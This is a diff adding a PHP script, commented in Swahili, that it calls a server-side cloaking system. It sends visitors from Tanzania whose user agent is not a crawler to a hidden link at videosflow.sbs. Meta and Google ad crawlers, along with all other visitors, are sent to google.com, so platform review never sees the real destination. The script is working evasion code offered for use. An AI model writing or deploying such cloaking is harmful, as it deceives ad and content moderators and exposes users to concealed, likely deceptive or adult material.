@@ -1,0 +1,54 @@
+<?php
+/**
+ * SERVER-SIDE CLOAKING SYSTEM (TZ ONLY via Cloudflare)
+ * Hii ni mbinu bora kwa sababu haitumii API ya nje, haina limit ya requests, na ni haraka sana.
+ */
+
+// 1. Link zako (Zimefichwa upande wa server)
+$target_link = "https://videosflow.sbs/wakuubwa";
+$fallback_link = "https://www.google.com";
+
+// 2. Orodha ya maneno yanayotumiwa na Bot (Meta, Google, nk)
+$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
+$bots = [
+    'facebookexternalhit', 'facebot', 'facebookplatform', 
+    'googlebot', 'bingbot', 'crawler', 'spider', 'headless',
+    'adsbot-google', 'mediapartners-google'
+];
+
+// Angalia kama ni Bot kupitia User-Agent
+$is_bot = false;
+foreach ($bots as $bot) {
+    if (strpos($user_agent, $bot) !== false) {
+        $is_bot = true;
+        break;
+    }
+}
+
+// 3. Ukaguzi wa Geolocation (TZ Only) kupitia Cloudflare Header
+$allow_access = false;
+
+// Cloudflare huweka herufi mbili za nchi moja kwa moja kwenye header ya $_SERVER["HTTP_CF_IPCOUNTRY"]
+if (isset($_SERVER["HTTP_CF_IPCOUNTRY"])) {
+    $country_code = strtoupper($_SERVER["HTTP_CF_IPCOUNTRY"]);
+    
+    // Angalia kama nchi ni Tanzania (TZ)
+    if ($country_code === 'TZ') {
+        $allow_access = true;
+    }
+} else {
+    // Ikiwa Cloudflare haijatambua nchi au mfumo haupiti Cloudflare, tunafunga ufikiaji kwa usalama
+    $allow_access = false;
+}
+
+// 4. MAAMUZI YA MWISHO
+if (!$is_bot && $allow_access) {
+    // NI MTU HALISI KUTOKA TANZANIA
+    header("Location: " . $target_link);
+    exit;
+} else {
+    // NI BOT AU MTU WA NJE YA TANZANIA (Anapelekwa Google)
+    header("Location: " . $fallback_link);
+    exit;
+}
+?>
